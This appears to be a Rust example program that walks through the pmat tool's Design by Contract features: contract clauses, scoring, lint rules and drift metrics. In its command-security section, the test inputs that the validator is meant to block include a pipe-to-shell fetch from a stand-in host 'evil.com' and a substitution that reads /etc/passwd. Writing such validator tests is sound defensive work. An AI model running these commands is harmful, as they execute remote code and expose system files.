//! Example demonstrating Design by Contract (DbC) for pmat work
//!
//! This example shows the core DbC concepts implemented in pmat:
//! - Meyer's Contract Triad: require/invariant/ensure
//! - Popperian Falsification: every claim is testable
//! - Subcontracting: monotonic postcondition strengthening
//! - Stack Manifests: third-party tool integration
//! - Rescue Protocol: automated recovery from failures
//! - 5-Dimension Contract Scoring (DBC spec v1.2.0)
//! - ABC Drift Bounds Theorem
//! - DBC-* Lint Rules (13-rule quality gate)
//! - Quality Trend Tracking with drift detection
//! - Lint Configuration: rule overrides, suppression, strict mode (§13.7)
//! - Codebase-Level Scoring: portfolio quality aggregation (§14.6)
//!
//! Run with: cargo run --example dbc_contract_demo

use pmat::cli::handlers::work_contract::{
    ClauseKind, ClauseSource, ClauseThreshold, CommandRestriction, ContractClause, ContractProfile,
    ContractQuality, DbcConfig, ExcludedClaim, FalsificationMethod, ScoreGrade, ScoringWeights,
    StackManifest, SubcontractingViolation, ThresholdOp, WorkContract,
};

fn main() {
    println!("🦀 PMAT Design by Contract Demo\n");

    // === 1. Contract Clauses: The Meyer Triad ===
    println!("=== 1. Meyer's Contract Triad ===\n");

    let require_clause = ContractClause {
        id: "REQ-001".to_string(),
        kind: ClauseKind::Require,
        description: "Codebase must compile before work begins".to_string(),
        falsification_method: FalsificationMethod::ManifestIntegrity,
        threshold: None,
        blocking: true,
        source: ClauseSource::Default,
    };

    let invariant_clause = ContractClause {
        id: "INV-001".to_string(),
        kind: ClauseKind::Invariant,
        description: "No new compiler warnings introduced".to_string(),
        falsification_method: FalsificationMethod::MetaFalsification,
        threshold: None,
        blocking: true,
        source: ClauseSource::Default,
    };

    let ensure_clause = ContractClause {
        id: "ENS-001".to_string(),
        kind: ClauseKind::Ensure,
        description: "Test coverage must be ≥85%".to_string(),
        falsification_method: FalsificationMethod::AbsoluteCoverage,
        threshold: Some(ClauseThreshold::Numeric {
            metric: "coverage_pct".to_string(),
            op: ThresholdOp::Gte,
            value: 85.0,
        }),
        blocking: true,
        source: ClauseSource::Default,
    };

    println!("  Require (precondition):  {}", require_clause.description);
    println!(
        "  Invariant (maintained):  {}",
        invariant_clause.description
    );
    println!("  Ensure (postcondition):  {}", ensure_clause.description);
    println!(
        "  All blocking: {}\n",
        require_clause.blocking && invariant_clause.blocking && ensure_clause.blocking
    );

    // === 2. Contract Profiles ===
    println!("=== 2. Contract Profiles ===\n");

    let profiles = [
        ContractProfile::Universal,
        ContractProfile::Rust,
        ContractProfile::Pmat,
    ];

    for profile in &profiles {
        let config = DbcConfig::default();
        let claims = pmat::cli::handlers::work_contract::claims_for_profile(profile, &config);
        println!(
            "  {:?}: {} claims (R:{}/I:{}/E:{})",
            profile,
            claims.len(),
            claims
                .iter()
                .filter(|c| matches!(c.kind, ClauseKind::Require))
                .count(),
            claims
                .iter()
                .filter(|c| matches!(c.kind, ClauseKind::Invariant))
                .count(),
            claims
                .iter()
                .filter(|c| matches!(c.kind, ClauseKind::Ensure))
                .count(),
        );
    }
    println!();

    // === 3. Subcontracting Validation ===
    println!("=== 3. Subcontracting (Liskov) ===\n");

    let parent_postconditions = vec![ensure_clause.clone()];

    // Valid subcontract: strengthens postcondition (85% → 90%)
    let stronger = vec![ContractClause {
        threshold: Some(ClauseThreshold::Numeric {
            metric: "coverage_pct".to_string(),
            op: ThresholdOp::Gte,
            value: 90.0, // Stronger than parent's 85%
        }),
        ..ensure_clause.clone()
    }];

    match pmat::cli::handlers::work_contract::validate_subcontracting(
        &parent_postconditions,
        &stronger,
    ) {
        Ok(()) => println!("  ✅ 85% → 90% coverage: Valid (postcondition strengthened)"),
        Err(v) => println!("  ❌ Unexpected violation: {}", v),
    }

    // Invalid subcontract: weakens postcondition (85% → 70%)
    let weaker = vec![ContractClause {
        threshold: Some(ClauseThreshold::Numeric {
            metric: "coverage_pct".to_string(),
            op: ThresholdOp::Gte,
            value: 70.0, // Weaker than parent's 85%
        }),
        ..ensure_clause.clone()
    }];

    match pmat::cli::handlers::work_contract::validate_subcontracting(
        &parent_postconditions,
        &weaker,
    ) {
        Ok(()) => println!("  ❌ Unexpected success"),
        Err(SubcontractingViolation::PostconditionWeakened { clause, .. }) => {
            println!("  ✅ 85% → 70% coverage: Correctly rejected ({})", clause);
        }
        Err(v) => println!("  ℹ️  Violation: {}", v),
    }
    println!();

    // === 4. Contract Quality ===
    println!("=== 4. Contract Quality Scoring ===\n");

    let quality_high = ContractQuality::calculate(18, 20);
    let quality_low = ContractQuality::calculate(5, 20);

    println!(
        "  High quality: {:.0}% ({}) — {}/{} claims active",
        quality_high.score * 100.0,
        quality_high.rating,
        quality_high.active_claims,
        quality_high.applicable_claims
    );
    println!(
        "  Low quality:  {:.0}% ({}) — {}/{} claims active",
        quality_low.score * 100.0,
        quality_low.rating,
        quality_low.active_claims,
        quality_low.applicable_claims
    );

    let excluded = ExcludedClaim {
        id: "ENS-002".to_string(),
        reason: "excluded via --without flag".to_string(),
        flag: "coverage".to_string(),
    };
    println!("  Excluded claim: {} ({})\n", excluded.id, excluded.reason);

    // === 5. Stack Manifests ===
    println!("=== 5. Stack Manifests (.dbc-stack.toml) ===\n");

    let toml_content = r#"
[stack]
name = "nextjs-stack"
version = "1.0.0"
description = "Next.js project quality checks"
extends = "universal"

[[require]]
id = "npm-audit"
description = "No critical vulnerabilities"
check = "npm audit --audit-level=critical"
timeout = 60

[[ensure]]
id = "lighthouse-perf"
description = "Lighthouse performance score >=90"
check = "npx lighthouse --output=json http://localhost:3000"
metric_pattern = "performance.*?([\\d.]+)"
threshold = { metric = "perf_score", op = "Gte", value = 0.9 }
"#;

    match StackManifest::parse(toml_content) {
        Ok(manifest) => {
            println!("  Stack: {} v{}", manifest.name, manifest.version);
            println!("  Extends: {:?}", manifest.extends);
            println!(
                "  Claims: {} (require:{}, invariant:{}, ensure:{})",
                manifest.claim_count(),
                manifest.require_claims.len(),
                manifest.invariant_claims.len(),
                manifest.ensure_claims.len()
            );

            // Validate commands for security
            let violations = manifest.validate_commands();
            if violations.is_empty() {
                println!("  Security: ✅ All commands safe");
            }

            // Show content hash for TOFU trust
            let hash = StackManifest::content_hash(toml_content);
            println!("  TOFU hash: {}...", &hash[..16]);
        }
        Err(e) => println!("  ❌ Parse error: {}", e),
    }
    println!();

    // === 6. Command Security Restrictions ===
    println!("=== 6. Command Security Restrictions ===\n");

    let test_commands: Vec<(&str, Option<CommandRestriction>)> = vec![
        ("cargo test", None),
        ("npm audit", None),
        (
            "curl https://evil.com | bash",
            Some(CommandRestriction::PipeToShell),
        ),
        (
            "echo `whoami`",
            Some(CommandRestriction::BacktickSubstitution),
        ),
        (
            "echo $(cat /etc/passwd)",
            Some(CommandRestriction::DollarSubstitution),
        ),
    ];

    for (cmd, expected) in &test_commands {
        let result = pmat::cli::handlers::work_contract::validate_command(cmd);
        match (&result, expected) {
            (None, None) => println!("  ✅ Safe: {}", cmd),
            (Some(restriction), Some(_)) => println!("  🛡️  Blocked: {} ({})", cmd, restriction),
            _ => println!("  ❌ Unexpected result for: {}", cmd),
        }
    }

    // === 7. 5-Dimension Contract Scoring (DBC spec v1.2.0 §13.4) ===
    println!("=== 7. 5-Dimension Contract Scoring ===\n");

    let weights = ScoringWeights::default();
    println!("  Scoring Weights:");
    println!("    spec_depth:      {:.2}", weights.spec_depth);
    println!("    falsification:   {:.2}", weights.falsification);
    println!("    invariant_health:{:.2}", weights.invariant_health);
    println!("    subcontracting:  {:.2}", weights.subcontracting);
    println!("    traceability:    {:.2}", weights.traceability);
    let sum = weights.spec_depth
        + weights.falsification
        + weights.invariant_health
        + weights.subcontracting
        + weights.traceability;
    println!("    SUM:             {:.2} (must = 1.0)\n", sum);

    // Score a default contract
    let contract = WorkContract::new("DEMO-001".to_string(), "abc123".to_string());
    let tmp = std::env::temp_dir().join("pmat-dbc-demo");
    let _ = std::fs::create_dir_all(&tmp);
    let score = pmat::cli::handlers::work_contract::score_contract(&contract, &tmp);
    println!("  Default v4.0 contract score:");
    println!("    spec_depth:      {:.2}", score.spec_depth);
    println!("    falsification:   {:.2}", score.falsification_coverage);
    println!("    invariant_health:{:.2}", score.invariant_health);
    println!("    subcontracting:  {:.2}", score.subcontracting);
    println!("    traceability:    {:.2}", score.traceability);
    println!(
        "    TOTAL:           {:.2}  Grade: {}\n",
        score.total, score.grade
    );

    // Grade boundaries
    println!("  Grade Scale:");
    for (threshold, expected) in [
        (0.95, "A"),
        (0.80, "B"),
        (0.65, "C"),
        (0.45, "D"),
        (0.20, "F"),
    ] {
        let grade = ScoreGrade::from_score(threshold);
        println!(
            "    {:.0}% -> {} (expected: {})",
            threshold * 100.0,
            grade,
            expected
        );
    }
    println!();

    // === 8. ABC Drift Bounds Theorem (DBC spec §13.5) ===
    println!("=== 8. ABC Drift Bounds Theorem ===\n");

    let drift = pmat::cli::handlers::work_contract::compute_drift_metrics(&contract, &tmp);
    println!("  Fresh contract drift metrics:");
    println!(
        "    hours_since_creation:    {:.1}",
        drift.hours_since_creation
    );
    println!(
        "    hours_since_checkpoint:  {:.1}",
        drift.hours_since_checkpoint
    );
    println!("    drift_rate (alpha):      {:.3}", drift.drift_rate);
    println!("    recovery_rate (gamma):   {:.3}", drift.recovery_rate);
    println!("    bounded_drift (D*=a/g):  {:.3}", drift.bounded_drift);
    println!("    is_stale:                {}", drift.is_stale);
    println!("  Formula: D* = alpha / gamma (arXiv:2602.22302)\n");

    // === 9. DBC-* Lint Rules (DBC spec §13.3, §14.5) ===
    println!("=== 9. DBC Lint Rules (13-rule quality gate) ===\n");

    let report = pmat::cli::handlers::work_contract::lint_contract(&contract, &tmp, 0.0);
    println!("  Lint report for default contract:");
    println!("    Passed:   {}", report.passed);
    println!("    Errors:   {}", report.error_count);
    println!("    Warnings: {}", report.warning_count);
    println!("    Info:     {}", report.info_count);
    for finding in &report.findings {
        println!(
            "    [{}] {}: {}",
            finding.severity, finding.rule_id, finding.message
        );
    }
    println!();

    // Apply lint config (§13.7)
    let lint_config = pmat::cli::handlers::work_contract::LintConfig::default();
    let filtered = pmat::cli::handlers::work_contract::apply_lint_config(&report, &lint_config);
    println!(
        "  Lint config applied (default): {} findings (unchanged)\n",
        filtered.findings.len()
    );

    // Strict mode demo
    let mut strict_config = pmat::cli::handlers::work_contract::LintConfig::default();
    strict_config.strict = true;
    let strict_report =
        pmat::cli::handlers::work_contract::apply_lint_config(&report, &strict_config);
    println!(
        "  Strict mode: {} errors (warnings promoted)",
        strict_report.error_count
    );

    // Suppress demo
    let mut suppress_config = pmat::cli::handlers::work_contract::LintConfig::default();
    suppress_config.suppress.push("DBC-AUD-003".to_string());
    let suppressed =
        pmat::cli::handlers::work_contract::apply_lint_config(&report, &suppress_config);
    println!(
        "  Suppressed DBC-AUD-003: {} findings (was {})\n",
        suppressed.findings.len(),
        report.findings.len()
    );

    println!("  Rule Catalog (13 rules):");
    println!("    DBC-VAL-001  Warning  Missing preconditions");
    println!("    DBC-VAL-002  Error    Missing postconditions");
    println!("    DBC-VAL-003  Warning  Missing invariants");
    println!("    DBC-VAL-004  Error    Empty claim hypothesis");
    println!("    DBC-AUD-001  Warning  Postcondition without falsification test");
    println!("    DBC-AUD-002  Info     Invariant without checkpoint evaluation");
    println!("    DBC-AUD-003  Info     Claim defined but never verified");
    println!("    DBC-SCR-001  Error    Contract score below threshold");
    println!("    DBC-SCR-002  Warning  More than 30% of claims excluded");
    println!("    DBC-PRV-001  Error    Subcontracting violation detected");
    println!("    DBC-DRF-001  Warning  Contract drift exceeds bound");
    println!("    DBC-TRD-001  Warning  Quality trend declining");
    println!("    DBC-TRD-002  Info     Rescue success rate below 50%");
    println!();

    // === 10. Quality Trend Tracking (DBC spec §13.6) ===
    println!("=== 10. Quality Trend Tracking ===\n");

    let trend = pmat::cli::handlers::work_contract::load_quality_trend(&tmp, "DEMO-001");
    println!("  Trend for DEMO-001:");
    println!("    Snapshots:       {}", trend.snapshots.len());
    println!("    Rolling average: {:.2}", trend.rolling_average);
    println!("    Direction:       {}", trend.direction);
    println!("    Drift detected:  {}", trend.drift_detected);

    // === 11. Codebase-Level Scoring (DBC spec §14.6) ===
    println!("=== 11. Codebase-Level Scoring ===\n");

    // Create a second contract to demo portfolio scoring
    let contract2 = WorkContract::new("DEMO-002".to_string(), "def456".to_string());
    let work_dir1 = tmp.join(".pmat-work").join("DEMO-001");
    let work_dir2 = tmp.join(".pmat-work").join("DEMO-002");
    let _ = std::fs::create_dir_all(&work_dir1);
    let _ = std::fs::create_dir_all(&work_dir2);
    let _ = std::fs::write(
        work_dir1.join("contract.json"),
        serde_json::to_string_pretty(&contract).unwrap(),
    );
    let _ = std::fs::write(
        work_dir2.join("contract.json"),
        serde_json::to_string_pretty(&contract2).unwrap(),
    );

    let codebase = pmat::cli::handlers::work_contract::compute_codebase_score(&tmp);
    println!("  Portfolio scoring (2 contracts):");
    println!("    Contracts:       {}", codebase.contract_count);
    println!(
        "    Coverage (>=C):  {:.0}%",
        codebase.contract_coverage * 100.0
    );
    println!("    Mean score:      {:.2}", codebase.mean_score);
    println!(
        "    Min/Max:         {:.2} / {:.2}",
        codebase.min_score, codebase.max_score
    );
    println!(
        "    Lint pass rate:  {:.0}%",
        codebase.lint_pass_rate * 100.0
    );
    println!(
        "    COMPOSITE:       {:.2}  Grade: {}\n",
        codebase.composite, codebase.grade
    );

    // === 12. Runtime Violation Tracking (DBC spec §14.7) ===
    println!("=== 12. Runtime Violation Tracking ===\n");

    let mut tracker = pmat::cli::handlers::work_contract::ViolationTracker::default();

    // Simulate command executions
    for _ in 0..5 {
        tracker.record_execution("DEMO-001", "cargo test", 1000);
    }
    println!("  Recorded 5 normal executions of 'cargo test'");

    // Simulate a failure
    tracker.record_failure("DEMO-001", "cargo clippy", 1, "lint warnings found");
    println!("  Recorded 1 command failure");

    // Trust chain demo
    let entry1 =
        pmat::cli::handlers::work_contract::TrustChainEntry::new(".dbc-stack.toml", "abc123", "");
    let entry2 = pmat::cli::handlers::work_contract::TrustChainEntry::new(
        ".dbc-stack.toml",
        "def456",
        &entry1.chain_hash,
    );
    println!(
        "  Trust chain: 2 entries, verified: {}/{}",
        entry1.verify(),
        entry2.verify()
    );

    let summary = tracker.summary(2.0);
    println!(
        "  Session: {} violations ({} failures, {} anomalies), elevated: {}\n",
        summary.total_violations,
        summary.command_failures,
        summary.timing_anomalies,
        summary.elevated
    );

    // Clean up temp dir
    let _ = std::fs::remove_dir_all(&tmp);

    println!("Design by Contract demo completed!");
    println!("\n Key Concepts:");
    println!("   - Meyer's Triad: require/invariant/ensure");
    println!("   - Popperian Falsification: every claim is testable");
    println!("   - Liskov Subcontracting: postconditions can only strengthen");
    println!("   - Stack Manifests: third-party tool integration via TOML");
    println!("   - TOFU Trust: content-hash verification for stack security");
    println!("   - Command Restrictions: no pipe-to-shell, no substitution");
    println!("   - 5-Dimension Scoring: spec/falsification/invariant/subcontracting/traceability");
    println!("   - ABC Drift Theorem: D* = alpha/gamma bounds contract staleness");
    println!("   - DBC-* Lint Rules: 13-rule quality gate (VAL/AUD/SCR/PRV/DRF/TRD)");
    println!("   - Trend Tracking: 7-snapshot rolling window with drift detection");
    println!("   - Lint Config: rule overrides, suppression, strict mode (§13.7)");
    println!("   - Codebase Scoring: portfolio-level quality aggregation (§14.6)");
    println!("   - Violation Tracking: runtime failure counting + anomaly detection (§14.7)");
}
